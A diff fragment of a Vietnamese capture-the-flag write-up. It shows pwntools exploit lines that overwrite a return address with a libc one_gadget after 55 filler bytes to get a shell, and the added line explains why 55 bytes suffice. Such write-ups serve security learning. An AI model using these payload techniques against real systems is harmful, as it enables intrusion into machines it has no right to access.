@@ -70,6 +70,7 @@ print('one_gadget: ' + hex(libc.sym['one_gadget']))
   payload = b'n'*55 + p64(libc.sym['one_gadget'])
 r.sendlineafter(b': ', payload)
   ```
+  - Do có 1 byte null tràn xuống nên chỉ cần ghi 55 byte
   - **Get shell**
   - ![image](https://user-images.githubusercontent.com/113702087/215040212-56973d58-24ab-41ea-a351-4b14b6990022.png)
   
